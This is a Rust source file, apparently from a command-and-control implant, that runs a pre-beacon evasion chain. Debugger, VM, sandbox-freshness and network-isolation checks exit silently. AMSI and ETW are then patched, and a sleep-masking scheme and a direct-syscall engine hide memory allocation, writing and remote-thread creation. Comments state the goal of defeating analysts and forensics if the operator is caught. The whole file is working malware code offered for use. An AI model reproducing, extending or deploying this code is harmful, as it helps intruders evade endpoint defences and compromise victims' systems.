//! chain.rs — Pre-beacon execution chain
//!
//! Master orchestrator that runs BEFORE the agent touches the network.
//! Every phase either passes silently or exits with `process::exit(0)`.
//!
//! Calling code (config.rs) calls `chain::execute(cfg)` once.
//! If it returns, ALL checks passed and the beacon loop can start.
//! If any check fails, the process exits silently — no crash, no log,
//! no error message. From the outside it looks like a normal clean exit.
//!
//! ARCHITECTURE:
//!   Phases 1-5 = DETECTION GATES (controlled by anti_vm checkbox)
//!     Phase 1: Anti-debug — ALWAYS runs (non-negotiable)
//!     Phase 2: Anti-VM — only if anti_vm checkbox ON
//!     Phase 3: Exec gap — only if anti_vm checkbox ON
//!     Phase 4: Env maturity — only if anti_vm checkbox ON
//!     Phase 5: Net probe — only if anti_vm checkbox ON
//!
//!   Phases 6-8 = EVASION PATCHES (controlled by their OWN UI dropdowns)
//!     Phase 6: AMSI patch — only if AMSI dropdown != "none"
//!     Phase 7: ETW patch — only if ETW dropdown != "none"
//!     Phase 8: Sleep mask key — only if Sleep dropdown != "none"
//!
//! NO CONFLICT: Each phase reads its own config field.
//!   - anti_vm checkbox → controls phases 1-5
//!   - AMSI dropdown → controls phase 6
//!   - ETW dropdown → controls phase 7
//!   - Sleep dropdown → controls phase 8
//!
//! UNIFIED LOG:
//!   All chain logs go to `hero_agent_debug.log` (same file as everything else).
//!   No separate chain log file — one file, full timeline from start to end.

use crate::core_agent::management::config::AgentConfig;
use crate::core_agent::evasion;

// ── FFI declarations for chain-specific C functions ───────────────────

#[cfg(all(target_os = "windows", feature = "cffi"))]
extern "C" {
    /// exec_gap.c — returns 0=ok, 1=suspicious (gap too small)
    fn exec_gap_check(min_gap_seconds: u32) -> i32;

    /// env_maturity.c — returns 0=ok, 1=immature (score below threshold)
    fn env_maturity_check(min_score: i32) -> i32;

    /// net_probe.c — returns 0=ok, 1=isolated (network too sparse)
    fn net_probe_check(min_arp_entries: i32) -> i32;

    /// syscall_mask.c — HERO GATE direct-syscall engine init
    /// Returns 1 = ready (forged stubs active), 0 = fallback mode (Win32 path)
    /// ISOLATION: zero shared state with Shadow7 / DR registers
    fn sm_init() -> i32;
}

// ── Thresholds (compile-time constants) ───────────────────────────────

/// Minimum seconds between file-drop and execution.
/// 60s = one minute. Sandboxes execute within 1-5 seconds.
const EXEC_GAP_MIN_SECONDS: u32 = 60;

/// Minimum maturity score across 5 signals (max = 15).
/// 4 = at least one strong signal or two medium signals.
const ENV_MATURITY_MIN_SCORE: i32 = 4;

/// Minimum ARP table entries to consider the network real.
/// 3 = gateway + at least 2 other hosts.
const NET_PROBE_MIN_ARP: i32 = 3;

// ─────────────────────────────────────────────────────────────────────
// Chain log — writes to hero_agent_debug.log (UNIFIED, single file)
//
// BUGFIX (Bug #8 — OPSEC): release builds used to write the full evasion
// config (AMSI technique, ETW technique, sleep mask, anti-VM mask, every
// phase pass/fail verdict) to disk in plaintext. That log file is a
// forensic treasure trove if the operator gets caught.
//
// FIX: log is DEBUG-BUILD ONLY. `cargo build --release` produces zero
// log files — verified by inspecting the binary and the working dir.
// Dev builds (`cargo build`) still get the log so operators can audit
// chain phases locally before going live.
// ─────────────────────────────────────────────────────────────────────

fn chain_log(msg: &str) {
    #[cfg(debug_assertions)]
    crate::core_agent::write_log("hero_agent_debug.log", msg);
}

// ─────────────────────────────────────────────────────────────────────
// Helper: check if detection gates should run
// Phases 3-5 only run when anti_vm detection is enabled.
// ─────────────────────────────────────────────────────────────────────

fn detection_gates_enabled(cfg: &AgentConfig) -> bool {
    !cfg.anti_vm_mask.is_empty() && cfg.anti_vm_mask != "none"
}

// ─────────────────────────────────────────────────────────────────────
// Public entry point
// ─────────────────────────────────────────────────────────────────────

/// Run the full pre-beacon chain.
///
/// Call this ONCE from config::run(), BEFORE beacon::start().
/// Returns normally only if every phase passed.
/// Any failure -> std::process::exit(0) — silent, clean.
pub fn execute(cfg: &AgentConfig) {
    chain_log("=== CHAIN START ===");
    chain_log(&format!("CONFIG: amsi={} etw={} sleep={} antivm={} direct_sys={}",
        cfg.amsi_technique, cfg.etw_technique, cfg.sleep_technique,
        cfg.anti_vm_mask, cfg.direct_sys));

    // ── DETECTION GATES (phases 1-5) ──
    phase1_anti_debug(cfg);
    phase2_anti_vm(cfg);
    phase3_exec_gap(cfg);
    phase4_env_maturity(cfg);
    phase5_net_probe(cfg);

    // ── EVASION PATCHES (phases 6-8) ──
    // These are controlled by their OWN UI dropdowns, independent of anti_vm.
    phase6_amsi(cfg);
    phase7_etw(cfg);
    phase8_sleep_key(cfg);

    // ── SYSCALL ENGINE (phase 9) ──
    // Controlled by direct_sys flag in profile [evasion] section.
    // COMPLETELY ISOLATED from Shadow7 — no shared state, no DR registers.
    // If sm_init() fails at runtime, agent continues with Win32 fallback.
    phase9_syscall_engine(cfg);

    chain_log("=== CHAIN COMPLETE — ALL PHASES PASSED ===");
}

// ─────────────────────────────────────────────────────────────────────
// Phase implementations
// ─────────────────────────────────────────────────────────────────────

/// Phase 1 — Anti-debug
/// ALWAYS runs. Zero network, zero disk, zero registry.
/// Uses: IsDebuggerPresent + RDTSC timing.
fn phase1_anti_debug(cfg: &AgentConfig) {
    chain_log("PHASE 1: Anti-debug check...");
    evasion::anti_debug_check();
    // anti_debug_check() calls exit(0) internally if debugger found.
    chain_log("PHASE 1: PASSED");
    let _ = cfg;
}

/// Phase 2 — Anti-VM (12-check hardened suite)
/// Configurable via AgentConfig.anti_vm_mask.
/// "none" -> skip entirely.
/// Returns: 0=clean, 1=inconclusive, 2=VM confirmed -> exit(0)
fn phase2_anti_vm(cfg: &AgentConfig) {
    chain_log(&format!("PHASE 2: Anti-VM check (mask={})...", cfg.anti_vm_mask));
    if cfg.anti_vm_mask.is_empty() || cfg.anti_vm_mask == "none" {
        chain_log("PHASE 2: SKIPPED (anti_vm disabled)");
        return;
    }

    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let mask = evasion::anti_vm_mask_from_config(cfg.anti_vm_mask);
        chain_log(&format!("PHASE 2: Running with mask=0x{:04X}", mask));
        let verdict = unsafe { evasion::call_anti_vm_check(mask) };
        chain_log(&format!("PHASE 2: verdict={} (0=clean,1=inconclusive,2=VM)", verdict));
        if verdict == 2 {
            chain_log("PHASE 2: FAILED — VM detected, exiting");
            std::process::exit(0);
        }
        chain_log("PHASE 2: PASSED");
    }

    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        chain_log("PHASE 2: SKIPPED (not windows or cffi disabled)");
    }
}

/// Phase 3 — Exec gap check
/// Compares our own file's on-disk timestamp to current time.
/// If executed too soon after being written -> likely automated analysis.
/// ONLY runs when anti_vm detection is enabled (same gate as phase 2).
fn phase3_exec_gap(cfg: &AgentConfig) {
    chain_log(&format!("PHASE 3: Exec gap check (min={}s)...", EXEC_GAP_MIN_SECONDS));

    if !detection_gates_enabled(cfg) {
        chain_log("PHASE 3: SKIPPED (anti_vm disabled)");
        return;
    }

    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let result = unsafe { exec_gap_check(EXEC_GAP_MIN_SECONDS) };
        chain_log(&format!("PHASE 3: result={} (0=ok,1=too_fresh)", result));
        if result != 0 {
            chain_log("PHASE 3: FAILED — file too fresh, exiting");
            std::process::exit(0);
        }
        chain_log("PHASE 3: PASSED");
    }

    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        chain_log("PHASE 3: SKIPPED (not windows or cffi disabled)");
    }
}

/// Phase 4 — Environment maturity
/// Checks 5 signals: prefetch, temp age, shimcache, event log, installed programs.
/// ONLY runs when anti_vm detection is enabled.
fn phase4_env_maturity(cfg: &AgentConfig) {
    chain_log(&format!("PHASE 4: Env maturity check (min_score={})...", ENV_MATURITY_MIN_SCORE));

    if !detection_gates_enabled(cfg) {
        chain_log("PHASE 4: SKIPPED (anti_vm disabled)");
        return;
    }

    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let result = unsafe { env_maturity_check(ENV_MATURITY_MIN_SCORE) };
        chain_log(&format!("PHASE 4: result={} (0=mature,1=immature)", result));
        if result != 0 {
            chain_log("PHASE 4: FAILED — environment too fresh, exiting");
            std::process::exit(0);
        }
        chain_log("PHASE 4: PASSED");
    }

    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        chain_log("PHASE 4: SKIPPED (not windows or cffi disabled)");
    }
}

/// Phase 5 — Network environment probe
/// Reads ARP table, TCP connections, adapter count.
/// ONLY runs when anti_vm detection is enabled.
fn phase5_net_probe(cfg: &AgentConfig) {
    chain_log(&format!("PHASE 5: Net probe check (min_arp={})...", NET_PROBE_MIN_ARP));

    if !detection_gates_enabled(cfg) {
        chain_log("PHASE 5: SKIPPED (anti_vm disabled)");
        return;
    }

    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let result = unsafe { net_probe_check(NET_PROBE_MIN_ARP) };
        chain_log(&format!("PHASE 5: result={} (0=real,1=isolated)", result));
        if result != 0 {
            chain_log("PHASE 5: FAILED — network looks isolated, exiting");
            std::process::exit(0);
        }
        chain_log("PHASE 5: PASSED");
    }

    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        chain_log("PHASE 5: SKIPPED (not windows or cffi disabled)");
    }
}

/// Phase 6 — AMSI patch
/// Controlled by AMSI dropdown in UI (independent of anti_vm checkbox).
fn phase6_amsi(cfg: &AgentConfig) {
    let tech = evasion::amsi_technique_id(cfg.amsi_technique);
    chain_log(&format!("PHASE 6: AMSI patch (technique={})...", cfg.amsi_technique));
    if tech == 0 {
        chain_log("PHASE 6: SKIPPED (none)");
        return;
    }
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    unsafe { evasion::call_amsi_apply(tech); }
    chain_log("PHASE 6: PASSED");
}

/// Phase 7 — ETW patch
/// Controlled by ETW dropdown in UI (independent of anti_vm checkbox).
fn phase7_etw(cfg: &AgentConfig) {
    let tech = evasion::etw_technique_id(cfg.etw_technique);
    chain_log(&format!("PHASE 7: ETW patch (technique={})...", cfg.etw_technique));
    if tech == 0 {
        chain_log("PHASE 7: SKIPPED (none)");
        return;
    }
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    unsafe { evasion::call_etw_apply(tech); }
    chain_log("PHASE 7: PASSED");
}

/// Phase 8 — Shadow7 sleep masking validation
/// Shadow7 (PhantomInit) is lazy-initialized on first secure_sleep() call.
/// Phase 8 only validates the technique string — actual init happens in beacon loop.
/// Old sleep_mask.c (RC4/XOR/Wipe) is completely removed and replaced by Shadow7.
fn phase8_sleep_key(cfg: &AgentConfig) {
    chain_log(&format!("PHASE 8: Shadow7 sleep mask (technique={})...", cfg.sleep_technique));
    if cfg.sleep_technique == "none" || cfg.sleep_technique.is_empty() {
        chain_log("PHASE 8: SKIPPED (none — no sleep masking)");
        return;
    }
    if cfg.sleep_technique == "shadow7" {
        chain_log("PHASE 8: Shadow7 selected — PhantomInit will lazy-init on first secure_sleep()");
        chain_log("PHASE 8: Pillars: P1=SectionPhantom P2=NtDelay P3=HWBP P4=Decoy P5=StackSpoof P6=HeapEncrypt P7=HWBPRedirect");
        chain_log("PHASE 8: PASSED");
        return;
    }
    // Legacy technique string handling (rc4/xor/wipe mapped to shadow7 by from_str)
    chain_log(&format!("PHASE 8: Legacy technique '{}' — mapped to Shadow7", cfg.sleep_technique));
    chain_log("PHASE 8: PASSED (Shadow7)");
}

/// Phase 9 — HERO GATE direct-syscall engine initialisation
///
/// sm_init() builds the forged-stub page (RW alloc → write stubs → RX flip)
/// for the 4 high-risk Nt* syscalls. If it returns 0, agent falls back to
/// normal Win32 API path — no crash, no exit, graceful degradation.
///
/// ISOLATION CONTRACT (enforced in syscall_mask.c):
///   - Zero shared state with Shadow7 / PhantomCtx
///   - No DR0-DR3 usage (those belong to Shadow7/AMSI/ETW)
///   - Separate forge page, separate failure mode
///   - Stack spoof only (no HWBP for syscall return — GLM recommendation)
fn phase9_syscall_engine(cfg: &AgentConfig) {
    chain_log(&format!("PHASE 9: HERO GATE syscall engine (direct_sys={})...", cfg.direct_sys));

    if !cfg.direct_sys {
        chain_log("PHASE 9: SKIPPED (direct_sys=false in profile [evasion])");
        return;
    }

    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let result = unsafe { sm_init() };
        if result == 1 {
            chain_log("PHASE 9: PASSED — forged stubs active (RW→RX, no RWX)");
            chain_log("PHASE 9: Masked: NtAllocateVirtualMemory NtProtectVirtualMemory NtWriteVirtualMemory NtCreateThreadEx");
        } else {
            // Fallback — NOT a failure. Agent continues with Win32 path.
            // sm_is_ready() will return 0 so callers use VirtualAllocEx etc.
            chain_log("PHASE 9: sm_init() returned 0 — falling back to Win32 API path (non-fatal)");
        }
    }

    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        chain_log("PHASE 9: SKIPPED (not windows or cffi disabled)");
    }
}

// ─────────────────────────────────────────────────────────────────────
// Private helpers
// ─────────────────────────────────────────────────────────────────────

fn hex_decode_32(s: &str) -> Vec<u8> {
    (0..s.len().min(64))
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap_or(0))
        .collect()
}
